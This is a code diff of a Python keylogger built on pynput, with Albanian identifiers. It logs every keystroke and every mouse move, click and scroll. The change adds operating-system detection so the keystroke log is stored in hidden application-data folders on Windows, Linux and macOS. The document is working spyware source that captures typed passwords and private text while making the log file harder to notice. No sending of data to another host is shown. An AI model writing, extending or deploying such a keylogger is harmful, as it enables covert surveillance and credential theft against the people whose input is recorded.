@@ -3,17 +3,27 @@ import logging
 from pynput.mouse import Listener as MouseListener
 from pynput.keyboard import Listener as KeyboardListener
 
-
+#=======================================     KEYBOARD     =============================================#
 qelesat = []
 numerimi = 0
-# path=os.environ['appdata'] +'\\tekst.txt'
-path = 'tekst.txt'
 
+def pathi(arg):
+    global path
+    global app_datapath
+    if arg == "Windows":
+        path = os.environ['appdata'] + '\\tekst.txt'
+    elif arg == "Linux":
+        app_datapath = os.path.join(os.path.expanduser("~"), ".config", "appdata")
+        path = os.path.join(app_datapath, "tekst.txt")
+    elif arg == "macOS":
+        app_datapath = os.path.join(os.path.expanduser("~"), "Library", "Application Support")
+        path = os.path.join(app_datapath, "tekst.txt")
+    return path
+
+pathi_final = pathi(platform.system())
 
 def on_press(qeles) :
 	global qelesat, numerimi
-
-
 	qelesat.append(qeles)
 	numerimi +=1
 
@@ -23,7 +33,7 @@ def on_press(qeles) :
 		qelesat = []
 
 def write_file(qelesat):
-	with open(path,"a") as file:
+	with open(pathi_final,"a") as file:
 		for qeles in qelesat:
 			k = str(qeles).replace("'","")
 			
@@ -44,9 +54,9 @@ def write_file(qelesat):
 
 			elif k.find('qeles'):
 				file.write(k)
-				
-logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
+#=======================================     MOUSE     =============================================#
+logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_move(x, y):
     logging.info("Mouse moved to ({0}, {1})".format(x, y))
@@ -55,12 +65,10 @@ def on_click(x, y, button, pressed):
     if pressed:
         logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
 
-
 def on_scroll(x, y, dx, dy):
     logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
 
 mouse_listener = MouseListener (on_move=on_move, on_click=on_click, on_scroll=on_scroll)
-
 keyboard_listener = KeyboardListener(on_press=on_press)
 mouse_listener.start()
 keyboard_listener.start()
